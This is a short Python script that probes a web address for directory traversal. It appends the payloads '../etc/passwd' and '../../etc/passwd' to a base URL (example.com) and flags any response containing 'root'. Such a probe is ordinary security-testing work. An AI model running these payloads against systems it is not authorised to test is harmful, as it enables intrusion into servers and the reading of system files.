import requests

def test_directory_traversal(url):
    payloads = ["../etc/passwd", "../../etc/passwd"]
    vulnerabilities = []

    for payload in payloads:
        test_url = f"{url}/{payload}"
        response = requests.get(test_url)
        
        if "root" in response.text:  # Adjust based on expected content
            vulnerabilities.append(test_url)
    
    return vulnerabilities

if __name__ == "__main__":
    target_url = "http://example.com/files"
    results = test_directory_traversal(target_url)
    print(f"Possible directory traversal vulnerabilities: {results}")
